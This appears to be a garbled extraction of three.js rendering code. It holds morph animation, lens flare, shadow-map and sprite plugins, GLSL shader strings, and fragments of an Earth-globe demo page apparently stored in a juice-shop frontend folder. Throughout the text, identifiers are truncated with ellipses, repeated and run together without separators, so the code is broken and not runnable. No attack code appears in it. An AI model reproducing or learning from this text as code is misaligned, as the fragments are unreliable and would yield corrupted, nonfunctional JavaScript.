{}this.animationsMapthis.an ... t = [];this.an ... st = []this.animationsListnumFram ... .lengthvar nam ... fault";name = "__default"__defaultvar startFrame = 0;startFrame = 0var end ... es - 1;endFram ... mes - 1numFrames - 1var fps ... es / 1;fps = numFrames / 1numFrames / 1this.cr ...  fps );this.cr ... , fps )this.createAnimationthis.se ... e, 1 );this.se ... me, 1 )this.se ... nWeightvar ani ... \r\n\r\n\t};animati ... e\r\n\r\n\t}{\r\n\r\n\t\t ... e\r\n\r\n\t}startFrame: startendFrame: endlength: ... art + 1end - start + 1fps: fpsduratio ... ) / fps( end - ... ) / fpslastFrame: 0currentFrame: 0active: falsetime: 0direction: 1weight: 1directi ... : falsemirroredLoop: falsethis.an ... mation;this.an ... imationthis.an ...  name ]this.an ... tion );this.an ... ation )this.an ... st.pushpattern ... )(\d+)/([a-z]+)(\d+)var fir ... s = {};frameRanges = {}var chu ... tern );chunks  ... ttern )if ( ch ... \r\n\r\n\t\t}chunks  ... gth > 1chunks.length > 1chunks.lengthvar nam ... s[ 1 ];name = chunks[ 1 ]chunks[ 1 ]num = chunks[ 2 ]chunks[ 2 ]! frame ...  name ]frameRanges[ name ]frameRa ... nity };frameRa ... inity }var ran ... name ];range = ...  name ]i < range.startrange.startrange.start = i;range.start = ii > range.endrange.endrange.end = i;range.end = iif ( !  ... = name;firstAn ... = name;firstAn ...  = namethis.fi ... mation;this.fi ... imationthis.firstAnimationsetAnim ... Forwardvar ani ... name ];animati ...  name ]animati ... on = 1;animati ... ion = 1animation.directionanimati ...  false;animati ... = falseanimati ... ckwardssetAnim ... ackwardanimati ... n = -1;animati ... on = -1animati ... = true;animati ...  = trueTHREE.M ... tionFPSanimation.fps = fps;animation.fps = fpsanimation.fpsanimati ... on.fps;animati ... ion.fpsanimation.duration( anima ... ion.fpsTHREE.M ... urationanimati ... ration;animati ... uration( anima ... urationTHREE.M ... nWeightanimati ... weight;animati ...  weightanimation.weightTHREE.M ... ionTimeanimati ... = time;animati ...  = timeanimation.timevar time = 0;time = 0time =  ... n.time;time =  ... on.timereturn time;var duration = -1;duration = -1duratio ... ration;duratio ... urationreturn duration;animation.time = 0;animation.time = 0animation.active"animation[" + nameTHREE.M ... .updatethis.an ... .lengthvar ani ... t[ i ];animati ... st[ i ]this.an ... st[ i ]! animation.activeanimati ... .lengthanimation.lengthanimati ...  delta;animati ... * deltaif ( an ... \r\n\r\n\t\t}animati ... redLoopanimati ... ime < 0animation.time < 0animati ...  *= -1;animati ... n *= -1if ( an ... \r\n\t\t\t\t}if ( an ... ration;animati ... h - 1 )animation.startFrameanimati ... ameTimeanimation.length - 1var wei ... weight;weight  ... .weightkeyfram ... ntFrameanimati ... ntFramethis.mo ... Frame ]animation.lastFramethis.mo ... weight;this.mo ...  weight1 * weightanimati ... tFrame;animati ... yframe;animati ... eyframe( anima ... ameTime( anima ... eTime )if ( an ...  - mix;mix * weight( 1 - mix ) * weight( 1 - mix )var _gl ... e = {};_lensFlare = {}this.in ... ;\r\n\r\n\t}this.init_gl = r ... ontext;_gl = r ... context_render ... nderer;_renderer = renderer_precis ... sion();_precis ... ision()rendere ... ision()rendere ... ecision_lensFl ...  + 8 );_lensFl ... 8 + 8 )_lensFlare.verticesnew Flo ... 8 + 8 )8 + 8_lensFl ... y( 6 );_lensFl ... ay( 6 )_lensFlare.facesnew Uint16Array( 6 )var i = 0;_lensFl ... ] = -1;_lensFl ...  ] = -1_lensFl ... [ i++ ]_lensFl ...  ] = 0;_lensFl ... + ] = 0_lensFl ...  ] = 1;_lensFl ... + ] = 1i = 0;_lensFl ...  ] = 2;_lensFl ... + ] = 2_lensFl ...  ] = 3;_lensFl ... + ] = 3_lensFl ... ffer();_lensFl ... uffer()_lensFl ... xBuffer_lensFl ... tBuffer_lensFl ... ture();_lensFl ... xture()_lensFl ... Texture_gl.tex ... REST );_gl.tex ... AREST )_gl.get ...  ) <= 0_lensFl ...  false;_lensFl ... = false_lensFl ... sion );_lensFl ... ision )_lensFlare.programcreateP ... ision )THREE.S ... lare" ]THREE.ShaderFlareslensFlare_lensFl ... = true;_lensFl ...  = trueTHREE.S ... ture" ]"lensFl ... exture"lensFlareVertexTexture_lensFl ... s = {};_lensFl ... es = {}_lensFl ... ributes_lensFl ... ms = {}_lensFlare.uniforms_lensFl ... ion" );_lensFl ... tion" )_lensFl ... .vertex_gl.get ... tion" )_gl.get ... ocation_lensFl ... "uv" );_lensFl ...  "uv" )_lensFl ... utes.uv_gl.get ...  "uv" )_lensFl ... ype" );_lensFl ... Type" )_lensFl ... derType_gl.get ... Type" )_lensFl ... map" );_lensFl ... "map" )_lensFl ... rms.map_gl.get ... "map" )_lensFl ... Map" );_lensFl ... nMap" )_lensFl ... sionMap_gl.get ... nMap" )_lensFl ... ity" );_lensFl ... city" )_lensFl ... opacity_gl.get ... city" )_lensFl ... lor" );_lensFl ... olor" )_lensFl ... s.color_gl.get ... olor" )_lensFl ... ale" );_lensFl ... cale" )_lensFl ... s.scale_gl.get ... cale" )_lensFl ... otation_lensFl ... ositionvar fla ... length;flares  ... lFlaresnFlares ... .lengthflares.length! nFlaresvar tem ... tor3();tempPos ... ctor3()var inv ...  * 0.5;invAspe ... rtWidthviewpor ... rtWidthhalfVie ... h * 0.5viewportWidth * 0.5halfVie ... t * 0.5viewportHeight * 0.5var siz ... size );size =  ... tHeight16 / viewportHeightscale = ...  size )size * invAspectvar scr ... 1, 1 );screenP ...  1, 0 )screenP ...  1, 1 )var uni ... ibutes;_gl.ena ... rtex );_gl.ena ... ertex )_gl.ena ... s.uv );_gl.ena ... es.uv )_gl.uni ... p, 0 );_gl.uni ... ap, 0 )uniform ... sionMap_gl.uni ... p, 1 );_gl.uni ... ap, 1 )_gl.ver ... 8, 0 );_gl.ver ...  8, 0 )attributes.vertex2 * 8_gl.ver ... 8, 8 );_gl.ver ...  8, 8 )_gl.dep ... alse );_gl.dep ... false )var i,  ... sprite;i < nFlaressize =  ... Height;scale.s ... size );scale.s ...  size )scale.setflare = flares[ i ];flare = flares[ i ]flares[ i ]tempPos ... [14] );tempPos ... s[14] )tempPosition.setflare.m ... nts[12]flare.m ... lementsflare.matrixWorldflare.m ... nts[13]flare.m ... nts[14]tempPos ... erse );tempPos ... verse )tempPos ... Matrix4tempPos ... trix );tempPos ... atrix )tempPos ... jectionscreenP ... ition )screenPosition.copyscreenP ... tWidth;screenP ... rtWidthscreenP ... ixels.xscreenPosition.xscreenP ... Height;screenP ... tHeightscreenP ... ixels.yscreenPosition.y_lensFl ... eight )(\r\n\t\t\t\t ... eight )screenP ... s.y > 0screenP ... s.x > 0_gl.act ... URE1 );_gl.act ... TURE1 )_gl.TEXTURE1_gl.cop ... 6, 0 );_gl.cop ... 16, 0 )_gl.copyTexImage2DscreenP ... s.x - 8screenP ... s.y - 8_gl.uni ... e, 0 );_gl.uni ... pe, 0 )uniforms.renderType_gl.uni ... le.y );_gl.uni ... ale.y )_gl.uni ... on.z );_gl.uni ... ion.z )screenPosition.z_gl.dra ... T, 0 );_gl.dra ... RT, 0 )_gl.act ... URE0 );_gl.act ... TURE0 )_gl.uni ... e, 1 );_gl.uni ... pe, 1 )flare.p ... ition )flare.p ... en.copyflare.positionScreenif ( fl ... \r\n\t\t\t\t}flare.c ... allbackflare.c ... lare );flare.c ... flare )flare.u ... ares();flare.u ... lares()flare.u ... sFlares_gl.uni ... e, 2 );_gl.uni ... pe, 2 )jl = fl ... .lengthflare.l ... .lengthflare.lensFlaressprite  ... s[ j ];sprite  ... es[ j ]flare.l ... es[ j ]if ( sp ... \n\t\t\t\t\t}sprite. ... > 0.001sprite.opacitysprite.scale > 0.001sprite.scalescreenP ... rite.x;screenP ... prite.xsprite.xscreenP ... rite.y;screenP ... prite.ysprite.yscreenP ... rite.z;screenP ... prite.zsprite.zsprite. ... tHeightsprite. ... e.scalesprite.sizescale.x ... Aspect;scale.x ... vAspectscale.y = size;scale.y = size_gl.uni ... tion );_gl.uni ... ation )uniforms.rotationsprite.rotation_gl.uni ... city );_gl.uni ... acity )_gl.uni ... or.b );_gl.uni ... lor.b )uniforms.colorsprite.color.rsprite.colorsprite.color.gsprite.color.b_render ... dDst );_render ... ndDst )_render ... lendingsprite.blendingsprite.blendEquationsprite.blendSrcsprite.blendDst_render ... e, 1 );_render ... re, 1 )_renderer.setTexturesprite.texture_gl.dep ... true );_gl.dep ...  true )var fra ... ADER );fragmen ... HADER )_gl.cre ... HADER )_gl.createShadervar ver ... ADER );vertexS ... HADER )var pre ... at;\n";prefix  ... oat;\n""precis ... oat;\n" float;
_gl.sha ... ader );_gl.sha ... hader )_gl.shaderSourceprefix  ... tShaderprefix  ... xShader_gl.com ... ader );_gl.com ... hader )_gl.compileShadervar _gl ... tor3();_depthM ... rphSkin_min =  ... ctor3()_max =  ... ctor3()_matrix ... ctor3()var dep ... GBA" ];depthSh ... RGBA" ]THREE.S ... RGBA" ]var dep ... orms );depthUn ... forms )depthShader.uniforms_depthM ... ms } );_depthM ... rms } )new THR ... rms } ){ fragm ... forms }depthSh ... tShaderdepthSh ... xShader_depthM ... ue } );_depthM ... rue } )morphTargets: trueskinning: true_depthM ... = true;_depthM ...  = true_depthM ... dowPass! ( _re ... pdate )( _rend ... pdate )_render ... oUpdate_render ... Enabledthis.up ... mera );this.up ... amera )this.up ... }\r\n\r\n\t}var i,  ... = null;lights = []fog = null_gl.cle ... 1, 1 );_gl.cle ...  1, 1 )if ( _r ... \r\n\r\n\t\t}_render ... ceFront_render ... ullFace_render ... true );_render ...  true )_render ... pthTestil = sc ... .lengthlight = ... s[ i ];light = ... ts[ i ]scene.__lights[ i ]( light ... Cascade( light ... Light )for ( n ... \r\n\t\t\t\t}n < lig ... deCountvar virtualLight;! light ... ay[ n ]light.s ... ay[ n ]light.s ... deArrayvirtual ... t, n );virtual ... ht, n )createV ... ht, n )virtual ... camera;virtual ...  cameravirtual ... lCameravar gyr ... cope();gyro =  ... scope()new THR ... scope()gyro.po ... fset );gyro.po ... ffset )gyro.position.copygyro.positiongyro.ad ... ight );gyro.ad ... Light )gyro.addgyro.ad ... rget );gyro.ad ... arget )virtualLight.targetcamera.add( gyro );camera.add( gyro )camera.addlight.s ... lLight;light.s ... alLightconsole ... ight );console ... Light )"Create ... lLight"Created virtualLightvirtual ... y[ n ];virtual ... ay[ n ]updateV ... t, n );updateV ... ht, n )lights[ ... lLight;lights[ ... alLightlights[ k ]k ++;lights[ k ] = light;lights[ k ] = lightlight = lights[ i ];! light.shadowMapvar sha ... Filter;shadowF ... rFilterif ( _r ... \r\n\t\t\t\t}_render ... adowMap_render ... MapTypeshadowF ... Filter;shadowF ... tFiltervar par ... rmat };pars =  ... ormat }{ minFi ... ormat }minFilt ... wFiltermagFilt ... wFilterformat: ... AFormatlight.s ... pars );light.s ...  pars )new THR ...  pars )light.s ... ight );light.s ... eight )light.s ... rix4();light.s ... trix4()! light.shadowCameralight.shadowCameralight.s ... aFar );light.s ... raFar )new THR ... raFar )console ... dow" );console ... adow" )"Unsupp ... shadow"Unsupported light type for shadowscene.a ... mera );scene.a ... amera )light.s ... aHelper! light.cameraHelperlight.cameraHelperlight.c ... mera );light.c ... amera )new THR ... amera )light.s ... lper );light.s ... elper )light.s ... era.addlight.i ...  cameralight.isVirtualupdateS ... ight );updateS ... light )shadowM ... dowMap;shadowM ... adowMapshadowM ... Matrix;shadowM ... wMatrixshadowC ... Camera;shadowC ... wCamerashadowC ... orld );shadowC ... World )shadowC ... osition_matrix ... orld );_matrix ... World )_matrix ... ositionshadowC ... tion );shadowC ... ition )shadowCamera.lookAtshadowC ... orld();shadowC ... World()shadowC ... ixWorldshadowC ... Inverseif ( li ... isible;light.c ... isible;light.c ... Visiblelight.c ... visibleif ( li ... date();light.c ... date();light.c ... pdate()light.c ... .updateshadowM ...  1.0 );shadowM ... , 1.0 )shadowMatrix.setshadowM ... trix );shadowM ... atrix )shadowM ... ultiplyshadowC ... nMatrixshadowM ... erse );shadowM ... verse )_render ... wMap );_render ... owMap )_render ... rTarget_renderer.clear();_renderer.clear()_renderer.clearjl = re ... .lengthwebglOb ... t[ j ];webglOb ... st[ j ]renderList[ j ]var obj ... inning;if ( we ... \r\n\t\t\t\t}objectM ... ject );objectM ... bject )getObje ... bject )useMorp ... argets;useMorp ... Targetsobject. ... TargetsobjectM ... TargetsuseSkin ... inning;useSkin ... kinningobject  ... kinningobjectM ... kinningif ( us ... \n\t\t\t\t\t}materia ... alSkin;materia ... ialSkinuseMorp ... ialSkinmateria ... lMorph;materia ... alMorph_render ... rial );_render ... erial )_render ... alFacesif ( bu ... \n\t\t\t\t\t}_render ... rDirect_render ... rBuffer_render ... eObjectvar cle ... lpha();clearCo ... Color()_render ... Color()_render ... arColorclearAl ... Alpha()_render ... Alpha()_render ... arAlphaclearColor.rclearColor.gclearColor.bvar vir ... ight();virtual ... Light()virtual ... = true;virtual ...  = truevirtual ... Virtualvirtual ... yShadowvirtual ... tShadowvirtual ... raNear;virtual ... eraNearvirtual ... eraFar;virtual ... meraFarvirtual ... raLeft;virtual ... eraLeftvirtual ... aRight;virtual ... raRightvirtual ... Bottom;virtual ... aBottomvirtual ... eraTop;virtual ... meraTopvirtual ... isible;virtual ... Visiblevirtual ... rkness;virtual ... arknessvirtual ... cade ];virtual ... scade ]virtual ... dowBiaslight.s ... scade ]virtual ... apWidthvirtual ... pHeightvirtual ... d = [];virtual ... ld = []virtual ... tsWorldvirtual ... m = [];virtual ... um = []virtual ... Frustumvar poi ... rustum;pointsW ... tsWorldpointsF ... Frustumi < 8pointsW ... tor3();pointsW ... ctor3()pointsWorld[ i ]pointsF ... tor3();pointsF ... ctor3()pointsFrustum[ i ]var nea ... cade ];nearZ = ... scade ]var far ... cade ];farZ =  ... scade ]pointsF ... earZ );pointsF ... nearZ )pointsF ... 0 ].setpointsFrustum[ 0 ]pointsF ... 1 ].setpointsFrustum[ 1 ]pointsF ... 2 ].setpointsFrustum[ 2 ]pointsF ... 3 ].setpointsFrustum[ 3 ]pointsF ... farZ );pointsF ...  farZ )pointsF ... 4 ].setpointsFrustum[ 4 ]pointsF ... 5 ].setpointsFrustum[ 5 ]pointsF ... 6 ].setpointsFrustum[ 6 ]pointsF ... 7 ].setpointsFrustum[ 7 ]return virtualLight;var vir ... cade ];virtual ... tion );virtual ... ition )virtual ... on.copyvirtual ... ositionlight.t ... ositionvirtual ... rget );virtual ... arget )virtualLight.lookAtpointsF ...  nearZ;pointsF ... = nearZpointsFrustum[ 0 ].zpointsFrustum[ 1 ].zpointsFrustum[ 2 ].zpointsFrustum[ 3 ].zpointsF ... = farZ;pointsF ...  = farZpointsFrustum[ 4 ].zpointsFrustum[ 5 ].zpointsFrustum[ 6 ].zpointsFrustum[ 7 ].zvar sha ... sWorld;light.pointsFrustumlight.pointsWorld_min.se ... nity );_min.se ... inity )_min.set_max.se ... nity );_max.se ... inity )_max.setvar p = ... d[ i ];p = pointsWorld[ i ]p.copy( ...  i ] );p.copy( ... [ i ] )p.copyTHREE.S ... mera );THREE.S ... amera )THREE.S ... tVectorTHREE.S ... ojectorp.apply ... erse );p.apply ... verse )p.applyMatrix4p.x < _min.x_min.x_min.x = p.x;_min.x = p.xp.x > _max.x_max.x_max.x = p.x;_max.x = p.xp.y < _min.y_min.y_min.y = p.y;_min.y = p.yp.y > _max.y_max.y_max.y = p.y;_max.y = p.yp.z < _min.z_min.z_min.z = p.z;_min.z = p.zp.z > _max.z_max.z_max.z = p.z;_max.z = p.zshadowC ... _min.x;shadowC ...  _min.xshadowCamera.leftshadowC ... _max.x;shadowC ...  _max.xshadowCamera.rightshadowC ... _max.y;shadowC ...  _max.yshadowCamera.topshadowC ... _min.y;shadowC ...  _min.yshadowCamera.bottomshadowC ... trix();shadowC ... atrix()object. ... ls[ 0 ]THREE.S ... ctor();THREE.S ... ector()var _gl ... exture;var ver ... Buffer;vertice ... \n\t\t] );vertice ... \r\n\t\t] )new Flo ... \r\n\t\t] )[\r\n\t\t\t- ...  1\r\n\t\t]faces = ... \n\t\t] );faces = ... \r\n\t\t] )new Uin ... \r\n\t\t] )[\r\n\t\t\t0 ...  3\r\n\t\t]vertexB ... ffer();vertexB ... uffer()element ... ffer();element ... uffer()program ... gram();createProgram()attribu ... )\r\n\t\t};attribu ...  )\r\n\t\t}{\r\n\t\t\tp ...  )\r\n\t\t}positio ... tion' )_gl.get ... tion' )uv:\t\t\t\t ...  'uv' )_gl.get ...  'uv' )uniform ... )\r\n\t\t};uniform ...  )\r\n\t\t}{\r\n\t\t\tu ...  )\r\n\t\t}uvOffse ... fset' )_gl.get ... fset' )uvScale ... cale' )_gl.get ... cale' )rotatio ... tion' )scale:\t ... cale' )color:\t ... olor' )_gl.get ... olor' )map:\t\t\t ... 'map' )_gl.get ... 'map' )opacity ... city' )_gl.get ... city' )modelVi ... trix' )_gl.get ... trix' )project ... trix' )fogType ... Type' )_gl.get ... Type' )fogDens ... sity' )_gl.get ... sity' )fogNear ... Near' )_gl.get ... Near' )fogFar: ... gFar' )_gl.get ... gFar' )fogColo ... olor' )alphaTe ... Test' )_gl.get ... Test' )canvas.width = 8;canvas.width = 8canvas.height = 8;canvas.height = 8context ... fffff';context ... ffffff'context.fillStyle#ffffffcontext.fillRect_textur ... nvas );_textur ... anvas )new THR ... anvas )_textur ... = true;_textur ...  = true_texture.needsUpdatevar spr ... length;sprites ... SpritesnSprite ... .lengthsprites.length! nSprites_gl.ena ... tion );_gl.ena ... ition )uniform ... nMatrixvar oldFogType = 0;oldFogType = 0var sce ... pe = 0;sceneFogType = 0var fog = scene.fog;fog.color.rfog.color.gfog.color.b_gl.uni ... near );_gl.uni ... .near )_gl.uni ... .far );_gl.uni ... g.far )uniforms.fogTypeoldFogType = 1;oldFogType = 1sceneFogType = 1;sceneFogType = 1_gl.uni ... sity );_gl.uni ... nsity )oldFogType = 2;oldFogType = 2sceneFogType = 2;sceneFogType = 2oldFogType = 0;sceneFogType = 0;var i,  ... e = [];scale = []i < nSpritessprite  ... s[ i ];sprite  ... es[ i ]sprites[ i ]sprite.materialif ( sp ... ntinue;sprite. ... = falsesprite.visiblesprite. ... orld );sprite. ... World )sprite. ... atricessprite. ... wMatrixsprite.matrixWorldsprite. ... [ 14 ];sprite. ... s[ 14 ]- sprit ... s[ 14 ]sprite. ... lementssprites ... able );sprites ... table )sprites.sort_gl.uni ... Test );_gl.uni ... aTest )uniforms.alphaTestscale[  ... cale.x;scale[  ... scale.xscale[ 0 ]sprite.scale.xscale[  ... cale.y;scale[  ... scale.yscale[ 1 ]sprite.scale.yscene.f ... ial.fogfogType ... ogType;fogType ... FogTypefogType = 0;fogType = 0if ( ol ... \n\r\n\t\t\t}oldFogT ... fogType_gl.uni ... Type );_gl.uni ... gType )oldFogT ... ogType;oldFogType = fogType_gl.uni ... et.y );_gl.uni ... set.y )uniforms.uvOffsetmateria ... ffset.xmaterial.map.offsetmateria ... ffset.y_gl.uni ... at.y );_gl.uni ... eat.y )uniforms.uvScalemateria ... epeat.xmaterial.map.repeatmateria ... epeat.y_gl.uni ... 0, 0 );_gl.uni ...  0, 0 )_gl.uni ... 1, 1 );_gl.uni ...  1, 1 )material.color.rmaterial.color.gmaterial.color.b_gl.uni ... cale );_gl.uni ... scale )_render ... Test );_render ... hTest )_render ... Write )_render ... thWritemateria ... e.widthmateria ... p.imagematerial.map.image_render ... p, 0 );_render ... ap, 0 )_render ... e, 0 );_render ... re, 0 )_gl.sha ... n' ) );_gl.sha ... \n' ) )'precis ... float;''precis ... ision()_render ... ision()_render ... ecision'unifor ... atrix;''unifor ... ation;'uniform float rotation;'unifor ... scale;'uniform vec2 scale;'unifor ... ffset;'uniform vec2 uvOffset;'unifor ... Scale;'uniform vec2 uvScale;'attrib ... ition;'attribute vec2 position;varying vec2 vUV;'vUV =  ... Scale;'vUV = uvOffset + uv * uvScale;vUV = uvOffset uv uvScale;'vec2 a ... scale;'vec2 alignedPosition = position * scale;vec2 alignedPosition = position scale;'vec2 r ... ition;'vec2 rotatedPosition;'rotate ... ion.y;'rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;rotatedPositionx = cos( rotation ) rotation  alignedPositionx - sinrotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;y = sin cos'vec4 f ... ition;'vec4 finalPosition;'finalP ... 1.0 );'finalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );finalPosition = modelViewMatrix( 0.0, 0.0, 0.0, 1.0 ) 0.0, 0.0, 0.0, 1.0 'finalP ... ition;'finalPosition.xy += rotatedPosition;finalPosition= rotatedPosition;finalPosition = projectionMatrix * finalPosition;finalPosition = projectionMatrix finalPosition;'gl_Pos ... ition;'gl_Position = finalPosition;'unifor ... color;'uniform vec3 color;'unifor ... D map;'uniform sampler2D map;'unifor ... acity;''unifor ... gType;'uniform int fogType;'unifor ... Color;'uniform vec3 fogColor;'unifor ... nsity;'uniform float fogDensity;'unifor ... gNear;'uniform float fogNear;'unifor ... ogFar;'uniform float fogFar;'unifor ... aTest;'uniform float alphaTest;'vec4 t ... vUV );'vec4 texture = texture2D( map, vUV );vec4 texture = texture2D( map, vUV ) map, vUV 'if ( t ... scard;'if ( texture.a < alphaTest ) discard;if ( texture.a < alphaTest ) texture.a < alphaTest  texturea < alphaTest 'gl_Fra ... ity );'gl_FragColor = vec4( color * texture.xyz, texture.a * opacity );gl_FragColor = vec4( color * texture.xyz, texture.a * opacity ) color * texture.xyz, texture.a * opacity xyz, texture opacity 'if ( f ...  0 ) {'if ( fogType > 0 ) {'float  ... ord.w;'float depth = gl_FragCoord.z / gl_FragCoord.w;float depth = gl_FragCoord'float  ... = 0.0;'float fogFactor = 0.0;float fogFactor = 0'if ( f ...  1 ) {'if ( fogType == 1 ) {'fogFac ... pth );'fogFactor = smoothstep( fogNear, fogFar, depth );fogFactor = smoothstep} else {'const  ... 42695;'const float LOG2 = 1.442695;const float LOG2 = 1'float  ... OG2 );'float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );float fogFactor = exp2'fogFac ... 1.0 );'fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );fogFactor = 1'gl_Fra ... tor );'gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );gl_FragColor = mixreturn b.id - a.id;b.id - a.idTHREE.D ... sPluginthis.en ...  false;this.enabled = falsevar _gl ... rix4();! this.enabled_render ... rget );_render ... arget )if ( ob ... ntinue;object  ... aterial!object ... aterialif ( us ... \r\n\t\t\t\t}'lensFl ... )\r\n\r\n\t}'lensFl ... exture'vertexS ...  "\n" )[\r\n\r\n\t\t ...  "\n" )"unifor ... rType;"uniform lowp int renderType;uniform vec3 screenPosition;"unifor ... ation;""unifor ... onMap;"uniform sampler2D occlusionMap;"varyin ... ility;"varying float vVisibility;vUV = uv;"vec2 p ... ition;"vec2 pos = position;"if( re ...  2 ) {"if( renderType == 2 ) {"vec4 v ... 1 ) );"vec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );vec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) ) occlusionMap, vec2( 0.1, 0.1 )  occlusionMap, vec2( 0.1, 0.1 ) 0.1, 0.1 1, 01 "visibi ... 1 ) );"visibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );= texture2D( occlusionMap, vec2( 0.5, 0.1 ) ) occlusionMap, vec2( 0.5, 0.1 ) ( 0.5, 0.1 ) 0.5, 0.1 visibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );( occlusionMap, vec2( 0.9, 0.1 ) ) occlusionMap, vec2( 0.9, 0.1 ) ( 0.9, 0.1 ) 0.9, 0.1 9, 0"visibi ... 5 ) );"visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );( occlusionMap, vec2( 0.9, 0.5 ) ) occlusionMap, vec2( 0.9, 0.5 ) ( 0.9, 0.5 ) 0.9, 0.5 "visibi ... 9 ) );"visibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );( occlusionMap, vec2( 0.9, 0.9 ) ) occlusionMap, vec2( 0.9, 0.9 ) ( 0.9, 0.9 ) 0.9, 0.9 9 visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );( occlusionMap, vec2( 0.5, 0.9 ) ) occlusionMap, vec2( 0.5, 0.9 ) ( 0.5, 0.9 ) 0.5, 0.9 visibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );( occlusionMap, vec2( 0.1, 0.9 ) ) occlusionMap, vec2( 0.1, 0.9 ) ( 0.1, 0.9 ) 0.1, 0.9 visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );( occlusionMap, vec2( 0.1, 0.5 ) ) occlusionMap, vec2( 0.1, 0.5 ) ( 0.1, 0.5 ) 0.1, 0.5 visibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );( occlusionMap, vec2( 0.5, 0.5 ) ) occlusionMap, vec2( 0.5, 0.5 ) ( 0.5, 0.5 ) 0.5, 0.5 "vVisib ... / 9.0;"vVisibility =        visibility.r / 9.0;vVisibility =        visibilityr / 9vVisibility *= 1.0 - visibility.g / 9.0;vVisibility= 10 - visibilityg / 9vVisibility *=       visibility.b / 9.0;=       visibilityb / 9vVisibility *= 1.0 - visibility.a / 9.0;a / 9"pos.x  ... ion.y;"pos.x = cos( rotation ) * position.x - sin( rotation ) * position.y; position"pos.y  ... ion.y;"pos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;gl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );gl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 ) ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 ( pos * scale + screenPosition.xy ) pos * scale + screenPosition.xy  pos screenPositionxy, screenPositionz, 1fragmen ...  "\n" )[\r\n\r\n\t\t ... }"\r\n\t\t]"unifor ... D map;""unifor ... color;""if( re ...  0 ) {"if( renderType == 0 ) {"gl_Fra ... 0.0 );"gl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );( 1.0, 0.0, 1.0, 0.0 ) 1.0, 0.0, 1.0, 0.0 "} else ...  1 ) {"} else if( renderType == 1 ) {"gl_Fra ... vUV );"gl_FragColor = texture2D( map, vUV );gl_FragColor = texture2D"vec4 t ... vUV );""textur ... ility;"texture.a *= opacity * vVisibility;= opacity vVisibility;"gl_Fra ... xture;"gl_FragColor = texture;"gl_Fra ... color;"gl_FragColor.rgb *= color;gl_FragColor= color;precision mediump float;gl_FragColor = vec4( texture2D( map, vUV ).rgb, 0.0 );( texture2D( map, vUV ).rgb, 0.0 ) texture2D( map, vUV ).rgb, 0.0 rgb, 0"float  ... ) ).a;"float visibility = texture2D( occlusionMap, vec2( 0.5, 0.1 ) ).a;float visibility = texture2Da;"visibi ... ) ).a;"visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) ).a;visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) ).a;visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) ).a;"visibi ... 4.0 );"visibility = ( 1.0 - visibility / 4.0 );visibility = ( 1.0 - visibility / 4.0 ) 1.0 - visibility / 4.0 0 - visibility / 4texture.a *= opacity * visibility; visibility;P:/My Drive/Git/juice-shop/frontend/src/assets/private/threejs-demo.htmlcameraControlcameraBGsceneBGcomposerclocksphereGeometrysphereMaterialcreateOrangeMaterialearthMesh'earth'cloudGeometry15.2cloudMaterialcreateCloudMaterialcloudMesh'clouds'ambientLight'ambient'directionalLight63rotationSpeedaddControlGuiaddStatsObjectmaterialColor"/assets/private/starry_background.jpg"bgPlanebgPassrenderPasseffectCopyorangeTexture"/assets/private/orangemap2k.jpg""/assets/private/earthspec4k.jpg""/assets/private/earth_normalmap_flat4k.jpg"orangeMaterial0x262626cloudTexture"/assets/private/fair_clouds_4k.png"controlObjectguidatGUI'rotationSpeed'addColor'ambientLightColor''directionalLightColor'setMode'absolute''0px'handleResize'resize'var renderer;var scene;var camera;var control;var stats;var cameraControl;var cameraBG;var sceneBG;var composer;var clock;var canvas;functio ... r();\r\n}{\r\n\r\n   ... r();\r\n}clock = ... lock();clock = ... Clock()new THREE.Clock()scene = ... cene();scene = ... Scene()camera  ...  1000);camera  ... , 1000)new THR ... , 1000)window. ... rHeightrendere ... erer();rendere ... derer()new THR ... derer()rendere ... , 1.0);rendere ... 0, 1.0)rendere ... eight);rendere ... Height)renderer.setSizerendere ... = true;rendere ...  = truerendere ... Enabledvar sph ... 0, 60);sphereG ... 60, 60)new THR ... 60, 60)var sph ... rial();sphereM ... erial()createO ... erial()var ear ... erial);earthMe ... terial)new THR ... terial)earthMe ... earth';earthMe ... 'earth'earthMesh.nameearthscene.a ... hMesh);scene.add(earthMesh)var clo ... 0, 60);cloudGe ... 60, 60)var clo ... rial();cloudMa ... erial()createC ... erial()var clo ... erial);cloudMe ... terial)cloudMe ... louds';cloudMe ... clouds'cloudMesh.namecloudsscene.a ... dMesh);scene.add(cloudMesh)var amb ... 11111);ambient ... 111111)new THR ... 111111)ambient ... bient';ambient ... mbient'ambientLight.namescene.a ... Light);scene.a ... tLight)var dir ... ff, 1);directi ... fff, 1)new THR ... fff, 1)directi ... , -50);directi ... 0, -50)directi ... ositionnew THR ... 0, -50)-50directi ... ional';directi ... tional'directi ... ht.namescene.a ... lLight)camera. ... x = 25;camera. ... .x = 25camera.position.xcamera. ... y = 10;camera. ... .y = 10camera.position.ycamera. ... z = 63;camera. ... .z = 63camera.position.zcamera. ... ition);camera. ... sition)camera.lookAtscene.positioncameraC ... amera);cameraC ... camera)new THR ... camera)control ... \n    };control ... \r\n   